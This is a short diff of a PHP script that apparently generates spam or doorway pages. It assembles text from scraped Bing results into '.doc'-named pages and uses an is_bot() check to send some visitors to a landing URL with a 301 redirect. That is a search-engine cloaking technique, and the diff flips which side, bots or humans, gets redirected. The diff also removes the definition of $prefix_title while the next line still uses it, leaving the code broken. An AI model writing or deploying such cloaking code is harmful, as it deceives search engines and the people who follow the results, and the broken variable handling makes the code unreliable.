@@ -12,7 +12,7 @@ $page_title= ucwords($this_title);
 $page_file_name= $page_file_name;
 
 
-if(!is_bot()){
+if(is_bot()){
 header("HTTP/1.1 301 Moved Permanently"); 
 header("Location: http://".LANDING_PAGE_URL."".urlencode($page_title));
 exit();
@@ -41,8 +41,6 @@ foreach($array_bing as $bing_array){
 
 $ini_full_text_content= implode(', ', $text_konten);
 
-$prefix_id= uniqid();
-$prefix_title= 'file: '.$prefix_id;
 $Filename_doc= $prefix_title."-".$page_file_name.".doc";
 
 
